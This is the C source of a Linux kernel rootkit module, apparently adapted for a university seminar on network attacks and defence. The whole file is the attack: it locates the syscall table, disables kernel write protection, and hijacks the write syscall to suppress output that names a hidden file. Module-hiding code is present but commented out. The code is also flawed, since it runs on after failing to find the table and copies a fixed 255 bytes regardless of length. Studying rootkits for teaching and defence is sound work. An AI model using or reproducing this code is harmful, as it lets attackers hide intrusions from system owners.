/*
 * Linux Rootkita 1/3
 * By Tyler Borland (TurboBorland)
 * http://turbochaos.blogspot.ch/2013/09/linux-rootkits-101-1-of-3.html?_escaped_fragment_#!
 *
 * Modified by
 * Cristoffel Gehring 
 * for
 * Seminar Angriffe Abwehr Netzwerke, ZHAW
 * June 2014
 *
 */
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

int aansctab_init(void);
void aansctab_exit(void);
module_init(aansctab_init);
module_exit(aansctab_exit);

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);

psize *sys_call_table;
psize **find(void) {
  psize **sctable;
  psize i = START_CHECK;
  while (i < END_CHECK) {
    sctable = (psize **) i;
    if (sctable[__NR_close] == (psize *) sys_close) {
      return &sctable[0];
    }
    i += sizeof(void *);
  }
  return NULL;
}

asmlinkage ssize_t aansctab_write(int fd, const char __user *buff, ssize_t count) {
        int r;
        int i;

        /* Dateiname, den wir verstecken wollen */
        char *proc_protect = ".aansctab";

        /* Speicher im Kernel reservieren */
        char *kbuff = (char *) kmalloc(256,GFP_KERNEL);

        /* Puffer vom Benutzer in den Kernel laden */
        copy_from_user(kbuff,buff,255);

        /* Puffer nach unserem Dateinamen durchsuchen */

        if (strstr(kbuff,proc_protect)) { /* Dateiname wurde gefunden */

                /* An alle Stellen im Puffer ein '\0' kopieren */
                for (i=0; i<255; i++)
                {
                        kbuff[i] = '\0';
                }

                /* Puffer zurück zum Benutzer kopieren */
                copy_to_user(buff, kbuff, 255);

                r = (*o_write)(fd,buff,count);

                kfree(kbuff);
                return r;
        }
        else { /* Der Dateiname wurde nicht gefunden */
                /* Nichts wird verändert */
                r = (*o_write)(fd,buff,count);

                kfree(kbuff);
                return r;
        }
}

int aansctab_init(void) {
  /* Do kernel module hiding (temporarly commentet out) */
  /* list_del_init(&__this_module.list); 
   * kobject_del(&THIS_MODULE->mkobj.kobj);
   */

  /* Find the sys_call_table address in kernel memory */
  if ((sys_call_table = (psize *) find())) {
    printk("aansctab: sys_call_table found at %p\n", sys_call_table);
  } else {
    printk("aansctab: sys_call_table not found, aborting\n");
  }

  /* disable write protect on page in cr0 */
  write_cr0(read_cr0() & (~ 0x10000));

  /* hijack functions */
  o_write = (void *) xchg(&sys_call_table[__NR_write],aansctab_write);

  /* return sys_call_table to WP */
  write_cr0(read_cr0() | 0x10000);

  return 0;
}

void aansctab_exit(void) {
  write_cr0(read_cr0() & (~ 0x10000));
  xchg(&sys_call_table[__NR_write],o_write);
  write_cr0(read_cr0() | 0x10000);
  printk("aansctab: Module unloaded\n");
}
